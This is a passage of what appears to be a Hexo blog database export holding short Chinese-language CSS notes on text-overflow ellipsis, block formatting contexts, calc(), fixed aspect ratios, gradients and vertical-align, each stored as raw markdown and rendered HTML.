19px&quot;)</span><br></pre></td></tr></table></figure>\n"},{"title":"CSS-文字超出隐藏","date":"2019-01-18T08:46:31.000Z","_content":"# 文字超出隐藏\n````\n.textOverflow {\n  overflow: hidden;\n  white-space: nowrap;\n  text-overflow:ellipsis;\n}\n````","source":"_posts/FrontEnd/HTML CSS/CSS-文字超出隐藏.md","raw":"---\ntitle: CSS-文字超出隐藏\ndate: 2019-01-18 16:46:31\ntags:\ncategories: CSS\n---\n# 文字超出隐藏\n````\n.textOverflow {\n  overflow: hidden;\n  white-space: nowrap;\n  text-overflow:ellipsis;\n}\n````","slug":"FrontEnd/HTML CSS/CSS-文字超出隐藏","published":1,"updated":"2019-01-18T08:47:37.801Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxy9007pzodvo9xts232","content":"<h1 id=\"文字超出隐藏\"><a href=\"#文字超出隐藏\" class=\"headerlink\" title=\"文字超出隐藏\"></a>文字超出隐藏</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.textOverflow &#123;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  white-space: nowrap;</span><br><span class=\"line\">  text-overflow:ellipsis;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"文字超出隐藏\"><a href=\"#文字超出隐藏\" class=\"headerlink\" title=\"文字超出隐藏\"></a>文字超出隐藏</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.textOverflow &#123;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  white-space: nowrap;</span><br><span class=\"line\">  text-overflow:ellipsis;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"CSS-潜藏着的BFC","date":"2015-04-16T07:54:04.000Z","archives":"样式表","_content":" ### 一、什么是BFC(Block Formatting Context)\n   写`CSS`样式时，对一个`元素`设置css,我们首先要知道这个元素是`块级元素`还是`行内元素`，而`BFC`就是用来**`格式化块级盒子`**的。<br>\n  `Formatting Context`：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br>\n  `BFC定义`：块级格式化上下文  它是指一个独立的块级渲染区域，只有`Block-level Box`参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br>\n \n ### 二、BFC的生成\n  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br>\n  满足下列CSS声明`之一`的元素便会生成BFC：\n   + 1.根元素或其它包含它的元素\n   + 2.float的值不为none；\n   + 3.overflow的值不为visible；\n   + 4.position的值不为static；\n   + 5.display的值为inline-block、table-cell、table-caption；\n   + 6.flex boxes (元素的display: flex或inline-flex)；\n   \n   注：也有人认为`display: table`能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。\n\n ### 三、BFC的布局规则\n  菜鸟教程待续\n  ","source":"_posts/FrontEnd/HTML CSS/CSS-潜藏着的BFC.md","raw":"---\ntitle: CSS-潜藏着的BFC\ndate: 2015-04-16 15:54:04\ntags: BFC\narchives: 样式表\ncategories: CSS\n---\n ### 一、什么是BFC(Block Formatting Context)\n   写`CSS`样式时，对一个`元素`设置css,我们首先要知道这个元素是`块级元素`还是`行内元素`，而`BFC`就是用来**`格式化块级盒子`**的。<br>\n  `Formatting Context`：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br>\n  `BFC定义`：块级格式化上下文  它是指一个独立的块级渲染区域，只有`Block-level Box`参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br>\n \n ### 二、BFC的生成\n  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br>\n  满足下列CSS声明`之一`的元素便会生成BFC：\n   + 1.根元素或其它包含它的元素\n   + 2.float的值不为none；\n   + 3.overflow的值不为visible；\n   + 4.position的值不为static；\n   + 5.display的值为inline-block、table-cell、table-caption；\n   + 6.flex boxes (元素的display: flex或inline-flex)；\n   \n   注：也有人认为`display: table`能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。\n\n ### 三、BFC的布局规则\n  菜鸟教程待续\n  ","slug":"FrontEnd/HTML CSS/CSS-潜藏着的BFC","published":1,"updated":"2018-09-05T06:33:18.445Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxya007rzodvog0ks5xg","content":"<h3 id=\"一、什么是BFC-Block-Formatting-Context\"><a href=\"#一、什么是BFC-Block-Formatting-Context\" class=\"headerlink\" title=\"一、什么是BFC(Block Formatting Context)\"></a>一、什么是BFC(Block Formatting Context)</h3><p>   写<code>CSS</code>样式时，对一个<code>元素</code>设置css,我们首先要知道这个元素是<code>块级元素</code>还是<code>行内元素</code>，而<code>BFC</code>就是用来<strong><code>格式化块级盒子</code></strong>的。<br><br>  <code>Formatting Context</code>：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br><br>  <code>BFC定义</code>：块级格式化上下文  它是指一个独立的块级渲染区域，只有<code>Block-level Box</code>参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br></p>\n<h3 id=\"二、BFC的生成\"><a href=\"#二、BFC的生成\" class=\"headerlink\" title=\"二、BFC的生成\"></a>二、BFC的生成</h3><p>  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br><br>  满足下列CSS声明<code>之一</code>的元素便会生成BFC：</p>\n<ul>\n<li>1.根元素或其它包含它的元素</li>\n<li>2.float的值不为none；</li>\n<li>3.overflow的值不为visible；</li>\n<li>4.position的值不为static；</li>\n<li>5.display的值为inline-block、table-cell、table-caption；</li>\n<li><p>6.flex boxes (元素的display: flex或inline-flex)；</p>\n<p>注：也有人认为<code>display: table</code>能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。</p>\n<h3 id=\"三、BFC的布局规则\"><a href=\"#三、BFC的布局规则\" class=\"headerlink\" title=\"三、BFC的布局规则\"></a>三、BFC的布局规则</h3><p>菜鸟教程待续</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一、什么是BFC-Block-Formatting-Context\"><a href=\"#一、什么是BFC-Block-Formatting-Context\" class=\"headerlink\" title=\"一、什么是BFC(Block Formatting Context)\"></a>一、什么是BFC(Block Formatting Context)</h3><p>   写<code>CSS</code>样式时，对一个<code>元素</code>设置css,我们首先要知道这个元素是<code>块级元素</code>还是<code>行内元素</code>，而<code>BFC</code>就是用来<strong><code>格式化块级盒子</code></strong>的。<br><br>  <code>Formatting Context</code>：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br><br>  <code>BFC定义</code>：块级格式化上下文  它是指一个独立的块级渲染区域，只有<code>Block-level Box</code>参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br></p>\n<h3 id=\"二、BFC的生成\"><a href=\"#二、BFC的生成\" class=\"headerlink\" title=\"二、BFC的生成\"></a>二、BFC的生成</h3><p>  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br><br>  满足下列CSS声明<code>之一</code>的元素便会生成BFC：</p>\n<ul>\n<li>1.根元素或其它包含它的元素</li>\n<li>2.float的值不为none；</li>\n<li>3.overflow的值不为visible；</li>\n<li>4.position的值不为static；</li>\n<li>5.display的值为inline-block、table-cell、table-caption；</li>\n<li><p>6.flex boxes (元素的display: flex或inline-flex)；</p>\n<p>注：也有人认为<code>display: table</code>能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。</p>\n<h3 id=\"三、BFC的布局规则\"><a href=\"#三、BFC的布局规则\" class=\"headerlink\" title=\"三、BFC的布局规则\"></a>三、BFC的布局规则</h3><p>菜鸟教程待续</p>\n</li>\n</ul>\n"},{"title":"动态计算","date":"2019-01-07T09:08:00.000Z","_content":"## 计算值\n可跨单位计算 \n> width : calc(~\"100% - 240px\");\n","source":"_posts/FrontEnd/HTML CSS/CSS-动态计算.md","raw":"---\ntitle: 动态计算\ndate: 2019-01-07 17:08:00\ntags:\ncategories: CSS\n---\n## 计算值\n可跨单位计算 \n> width : calc(~\"100% - 240px\");\n","slug":"FrontEnd/HTML CSS/CSS-动态计算","published":1,"updated":"2019-01-07T09:09:59.824Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyc007vzodv252sxibf","content":"<h2 id=\"计算值\"><a href=\"#计算值\" class=\"headerlink\" title=\"计算值\"></a>计算值</h2><p>可跨单位计算 </p>\n<blockquote>\n<p>width : calc(~”100% - 240px”);</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"计算值\"><a href=\"#计算值\" class=\"headerlink\" title=\"计算值\"></a>计算值</h2><p>可跨单位计算 </p>\n<blockquote>\n<p>width : calc(~”100% - 240px”);</p>\n</blockquote>\n"},{"title":"CSS固定宽高比","date":"2018-06-14T08:40:12.000Z","_content":"## 纯CSS实现固定宽高比\n````\n  <style type=\"text/css\">\n    .container {\n      position: relative;\n      width: 40%;\n      /*触发BFC，否则内部元素撑不开container*/\n      overflow: hidden;\n      /*为了让大家看清楚效果加的边*/\n      border: 1px solid black;\n    }\n\n    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/\n    .container::before {\n      display: block;\n      content: '';\n      margin-top: 50%;\n    }\n\n    .target {\n      position: absolute;\n      top: 0;\n      bottom: 0;\n      left: 0;\n      right: 0;\n      width: 100%;\n      height: 100%;\n    }\n  </style>\n\n<body>\n  <div class=\"container\">\n    <img class=\"target\" src=\"http://i2.tiimg.com/611341/b66c935ed2587806t.jpg\" alt=\"\">\n  </div>\n</body>\n````\n总结：\n\n容器元素：宽度百分比，`overflow：hidden;` 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为`target`容器确定定位参照。\n\n伪类元素：`margin-top`百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.\n\n目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。\n\n\n\n---\n[附：原文地址](https://www.cnblogs.com/coolle/p/6553092.html)\n\n[参考文献](https://www.cnblogs.com/xjnotxj/p/5517651.html)\n\n---\n## 背景色\n16进制cdc转rgb(204,221,204)\n\n","source":"_posts/FrontEnd/HTML CSS/CSS固定宽高比.md","raw":"---\ntitle: CSS固定宽高比\ndate: 2018-06-14 16:40:12\ntags: 固定宽高比\ncategories: HTML+CSS\n---\n## 纯CSS实现固定宽高比\n````\n  <style type=\"text/css\">\n    .container {\n      position: relative;\n      width: 40%;\n      /*触发BFC，否则内部元素撑不开container*/\n      overflow: hidden;\n      /*为了让大家看清楚效果加的边*/\n      border: 1px solid black;\n    }\n\n    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/\n    .container::before {\n      display: block;\n      content: '';\n      margin-top: 50%;\n    }\n\n    .target {\n      position: absolute;\n      top: 0;\n      bottom: 0;\n      left: 0;\n      right: 0;\n      width: 100%;\n      height: 100%;\n    }\n  </style>\n\n<body>\n  <div class=\"container\">\n    <img class=\"target\" src=\"http://i2.tiimg.com/611341/b66c935ed2587806t.jpg\" alt=\"\">\n  </div>\n</body>\n````\n总结：\n\n容器元素：宽度百分比，`overflow：hidden;` 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为`target`容器确定定位参照。\n\n伪类元素：`margin-top`百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.\n\n目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。\n\n\n\n---\n[附：原文地址](https://www.cnblogs.com/coolle/p/6553092.html)\n\n[参考文献](https://www.cnblogs.com/xjnotxj/p/5517651.html)\n\n---\n## 背景色\n16进制cdc转rgb(204,221,204)\n\n","slug":"FrontEnd/HTML CSS/CSS固定宽高比","published":1,"updated":"2018-09-05T06:33:18.446Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxye007xzodvp2c0hhch","content":"<h2 id=\"纯CSS实现固定宽高比\"><a href=\"#纯CSS实现固定宽高比\" class=\"headerlink\" title=\"纯CSS实现固定宽高比\"></a>纯CSS实现固定宽高比</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;style type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">    .container &#123;</span><br><span class=\"line\">      position: relative;</span><br><span class=\"line\">      width: 40%;</span><br><span class=\"line\">      /*触发BFC，否则内部元素撑不开container*/</span><br><span class=\"line\">      overflow: hidden;</span><br><span class=\"line\">      /*为了让大家看清楚效果加的边*/</span><br><span class=\"line\">      border: 1px solid black;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/</span><br><span class=\"line\">    .container::before &#123;</span><br><span class=\"line\">      display: block;</span><br><span class=\"line\">      content: &apos;&apos;;</span><br><span class=\"line\">      margin-top: 50%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    .target &#123;</span><br><span class=\"line\">      position: absolute;</span><br><span class=\"line\">      top: 0;</span><br><span class=\"line\">      bottom: 0;</span><br><span class=\"line\">      left: 0;</span><br><span class=\"line\">      right: 0;</span><br><span class=\"line\">      width: 100%;</span><br><span class=\"line\">      height: 100%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;/style&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;img class=&quot;target&quot; src=&quot;http://i2.tiimg.com/611341/b66c935ed2587806t.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>容器元素：宽度百分比，<code>overflow：hidden;</code> 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为<code>target</code>容器确定定位参照。</p>\n<p>伪类元素：<code>margin-top</code>百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.</p>\n<p>目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。</p>\n<hr>\n<p><a href=\"https://www.cnblogs.com/coolle/p/6553092.html\" target=\"_blank\" rel=\"noopener\">附：原文地址</a></p>\n<p><a href=\"https://www.cnblogs.com/xjnotxj/p/5517651.html\" target=\"_blank\" rel=\"noopener\">参考文献</a></p>\n<hr>\n<h2 id=\"背景色\"><a href=\"#背景色\" class=\"headerlink\" title=\"背景色\"></a>背景色</h2><p>16进制cdc转rgb(204,221,204)</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"纯CSS实现固定宽高比\"><a href=\"#纯CSS实现固定宽高比\" class=\"headerlink\" title=\"纯CSS实现固定宽高比\"></a>纯CSS实现固定宽高比</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;style type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">    .container &#123;</span><br><span class=\"line\">      position: relative;</span><br><span class=\"line\">      width: 40%;</span><br><span class=\"line\">      /*触发BFC，否则内部元素撑不开container*/</span><br><span class=\"line\">      overflow: hidden;</span><br><span class=\"line\">      /*为了让大家看清楚效果加的边*/</span><br><span class=\"line\">      border: 1px solid black;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/</span><br><span class=\"line\">    .container::before &#123;</span><br><span class=\"line\">      display: block;</span><br><span class=\"line\">      content: &apos;&apos;;</span><br><span class=\"line\">      margin-top: 50%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    .target &#123;</span><br><span class=\"line\">      position: absolute;</span><br><span class=\"line\">      top: 0;</span><br><span class=\"line\">      bottom: 0;</span><br><span class=\"line\">      left: 0;</span><br><span class=\"line\">      right: 0;</span><br><span class=\"line\">      width: 100%;</span><br><span class=\"line\">      height: 100%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;/style&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;img class=&quot;target&quot; src=&quot;http://i2.tiimg.com/611341/b66c935ed2587806t.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>容器元素：宽度百分比，<code>overflow：hidden;</code> 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为<code>target</code>容器确定定位参照。</p>\n<p>伪类元素：<code>margin-top</code>百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.</p>\n<p>目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。</p>\n<hr>\n<p><a href=\"https://www.cnblogs.com/coolle/p/6553092.html\" target=\"_blank\" rel=\"noopener\">附：原文地址</a></p>\n<p><a href=\"https://www.cnblogs.com/xjnotxj/p/5517651.html\" target=\"_blank\" rel=\"noopener\">参考文献</a></p>\n<hr>\n<h2 id=\"背景色\"><a href=\"#背景色\" class=\"headerlink\" title=\"背景色\"></a>背景色</h2><p>16进制cdc转rgb(204,221,204)</p>\n"},{"title":"CSS日常","date":"2018-08-02T06:48:51.000Z","_content":"## background\n\n### 关于 `background-size` 无效\n`b-size` 必须写在 `b:url()` 后面，否则不会生效\n```` \nbackground: url() no-repeat center center;  \n\nbackground-size: 100% 100%;\n````","source":"_posts/FrontEnd/HTML CSS/CSS日常.md","raw":"---\ntitle: CSS日常\ndate: 2018-08-02 14:48:51\ntags: CSS日常发现\ncategories: CSS\n---\n## background\n\n### 关于 `background-size` 无效\n`b-size` 必须写在 `b:url()` 后面，否则不会生效\n```` \nbackground: url() no-repeat center center;  \n\nbackground-size: 100% 100%;\n````","slug":"FrontEnd/HTML CSS/CSS日常","published":1,"updated":"2018-09-05T06:33:18.446Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyh0080zodvgui8azj6","content":"<h2 id=\"background\"><a href=\"#background\" class=\"headerlink\" title=\"background\"></a>background</h2><h3 id=\"关于-background-size-无效\"><a href=\"#关于-background-size-无效\" class=\"headerlink\" title=\"关于 background-size 无效\"></a>关于 <code>background-size</code> 无效</h3><p><code>b-size</code> 必须写在 <code>b:url()</code> 后面，否则不会生效<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background: url() no-repeat center center;  </span><br><span class=\"line\"></span><br><span class=\"line\">background-size: 100% 100%;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"background\"><a href=\"#background\" class=\"headerlink\" title=\"background\"></a>background</h2><h3 id=\"关于-background-size-无效\"><a href=\"#关于-background-size-无效\" class=\"headerlink\" title=\"关于 background-size 无效\"></a>关于 <code>background-size</code> 无效</h3><p><code>b-size</code> 必须写在 <code>b:url()</code> 后面，否则不会生效<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background: url() no-repeat center center;  </span><br><span class=\"line\"></span><br><span class=\"line\">background-size: 100% 100%;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"CSS样式线性过渡","date":"2018-08-01T09:49:20.000Z","_content":"## CSS背景色线性过渡\n> background: linear-gradient(top,#434345,#2f3032);\n\n````\n  background-image: -webkit-linear-gradient(top, #f6f6c8, #71fafe);\n  -webkit-background-clip: text;\n  -webkit-text-fill-color: transparent;\n````","source":"_posts/FrontEnd/HTML CSS/CSS样式线性过渡.md","raw":"---\ntitle: CSS样式线性过渡\ndate: 2018-08-01 17:49:20\ntags: 线性过渡 渐变色\ncategories: CSS\n---\n## CSS背景色线性过渡\n> background: linear-gradient(top,#434345,#2f3032);\n\n````\n  background-image: -webkit-linear-gradient(top, #f6f6c8, #71fafe);\n  -webkit-background-clip: text;\n  -webkit-text-fill-color: transparent;\n````","slug":"FrontEnd/HTML CSS/CSS样式线性过渡","published":1,"updated":"2018-12-27T06:14:57.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxyj0084zodvhf8el5d3","content":"<h2 id=\"CSS背景色线性过渡\"><a href=\"#CSS背景色线性过渡\" class=\"headerlink\" title=\"CSS背景色线性过渡\"></a>CSS背景色线性过渡</h2><blockquote>\n<p>background: linear-gradient(top,#434345,#2f3032);</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background-image: -webkit-linear-gradient(top, #f6f6c8, #71fafe);</span><br><span class=\"line\">-webkit-background-clip: text;</span><br><span class=\"line\">-webkit-text-fill-color: transparent;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"CSS背景色线性过渡\"><a href=\"#CSS背景色线性过渡\" class=\"headerlink\" title=\"CSS背景色线性过渡\"></a>CSS背景色线性过渡</h2><blockquote>\n<p>background: linear-gradient(top,#434345,#2f3032);</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background-image: -webkit-linear-gradient(top, #f6f6c8, #71fafe);</span><br><span class=\"line\">-webkit-background-clip: text;</span><br><span class=\"line\">-webkit-text-fill-color: transparent;</span><br></pre></td></tr></table></figure>"},{"title":"Vertical-align","date":"2018-05-28T08:12:42.000Z","_content":"### 基线概念\n+ Top (行盒子顶部)\n+ Bottom (行盒子底部)\n\n+ Text-top (字体顶部)\n+ Text-bottom (字体底部)\n\n+ Middle\n+ baseline\n\n\n![Vertical-align](https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n---\n[参考文章](https://www.jianshu.com/p/dea069fecb62)\n\n[Vertical-aligh 完全解读](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651554219&idx=1&sn=4647c8957b8063c2fd0433d351854610&chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&scene=0#rd)\n\n[完全解读2](http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/)","source":"_posts/FrontEnd/HTML CSS/Vertical-align.md","raw":"---\ntitle: Vertical-align\ndate: 2018-05-28 16:12:42\ntags: 垂直居中\ncategories: CSS\n---\n### 基线概念\n+ Top (行盒子顶部)\n+ Bottom (行盒子底部)\n\n+ Text-top (字体顶部)\n+ Text-bottom (字体底部)\n\n+ Middle\n+ baseline\n\n\n![Vertical-align](https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n---\n[参考文章](https://www.jianshu.com/p/dea069fecb62)\n\n[Vertical-aligh 完全解读](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651554219&idx=1&sn=4647c8957b8063c2fd0433d351854610&chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&scene=0#rd)\n\n[完全解读2](http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/)","slug":"FrontEnd/HTML CSS/Vertical-align","published":1,"updated":"2018-09-05T06:33:18.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxym0087zodvrrtpwvte","content":"<h3 id=\"基线概念\"><a href=\"#基线概念\" class=\"headerlink\" title=\"基线概念\"></a>基线概念</h3><ul>\n<li>Top (行盒子顶部)</li>\n<li><p>Bottom (行盒子底部)</p>\n</li>\n<li><p>Text-top (字体顶部)</p>\n</li>\n<li><p>Text-bottom (字体底部)</p>\n</li>\n<li><p>Middle</p>\n</li>\n<li>baseline</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"Vertical-align\"></p>\n<hr>\n<p><a href=\"https://www.jianshu.com/p/dea069fecb62\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651554219&amp;idx=1&amp;sn=4647c8957b8063c2fd0433d351854610&amp;chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&amp;scene=0#rd\" target=\"_blank\" rel=\"noopener\">Vertical-aligh 完全解读</a></p>\n<p><a href=\"http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/\" target=\"_blank\" rel=\"noopener\">完全解读2</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"基线概念\"><a href=\"#基线概念\" class=\"headerlink\" title=\"基线概念\"></a>基线概念</h3><ul>\n<li>Top (行盒子顶部)</li>\n<li><p>Bottom (行盒子底部)</p>\n</li>\n<li><p>Text-top (字体顶部)</p>\n</li>\n<li><p>Text-bottom (字体底部)</p>\n</li>\n<li><p>Middle</p>\n</li>\n<li>baseline</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"Vertical-align\"></p>\n<hr>\n<p><a href=\"https://www.jianshu.com/p/dea069fecb62\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651554219&amp;idx=1&amp;sn=4647c8957b8063c2fd0433d351854610&amp;chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&amp;scene=0#rd\" target=\"_blank\" rel=\"noopener\">Vertical-aligh 完全解读</a></p>\n<p><a href=\"http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/\" target=\"_blank\" rel=\"noopener\">完全解读2</a></p>\n"},{"title":"em布局","date":"2018-05-15T05:57:14.000Z","_content":"","source":"_posts/FrontEnd/HTML CSS/em布局.md","raw":"---\ntitle: em布局\ndate: 2018-05-15 13:57:14\ntags: em布局\ncategories: CSS\n---\n","slug":"FrontEnd/HTML 